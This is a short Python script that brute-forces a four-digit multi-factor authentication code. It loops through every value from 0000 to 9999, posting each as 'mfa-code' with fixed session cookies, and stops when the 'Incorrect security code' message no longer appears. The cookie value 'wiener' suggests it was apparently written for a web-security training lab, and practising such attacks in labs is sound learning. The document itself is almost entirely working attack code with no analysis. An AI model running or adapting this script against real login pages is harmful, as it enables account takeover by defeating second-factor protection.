import requests
""" Brute Force The OTP Because of Broken Logic
That Lets You Try Many Times Instead Of Being 
Blocked."""
# The URL you want to send the POST request to
TARGET_URL = "https://example.com"

# The word you are searching for in the responses
SEARCH_WORD = "Incorrect security code"

# The cookies you want to add with the request
FIXED_COOKIES = {
    'session': 'N9qq1XQOGYgGVeGlOWEHmCNp1Bhxt1iB',
    'verify': 'wiener'
}

# A list or range of values you want to loop through
data_variations = range(10000)


for i in data_variations:
    # place the number in the formate of OTP 4 digits (Ex:0000)
    formatted_number=f"{i:04d}"

    # The data payload to be sent with the POST request.
    # The dictionary key should match what your API expects (e.g., 'id', 'name', 'data').
    # We vary the value of 'data_key' in each loop iteration.
    payload = {
        'mfa-code': formatted_number,
    }

    try:
        # Send the POST request
        response = requests.post(TARGET_URL, data=payload,cookies=FIXED_COOKIES)
        
        # get the response
        response_text = response.text

        # Check if the specific word is in the response text (case-insensitive search)
        if SEARCH_WORD.lower() not in response_text.lower():
            print(f"succeed logged in with :{formatted_number}")
            break
        # print the tried number
        print(f"try:{formatted_number}")

    except requests.exceptions.RequestException as e:
        # Handle connection errors, timeouts, and HTTP errors
        print(f"An error occurred: {e}")
    

print("Script finished.")
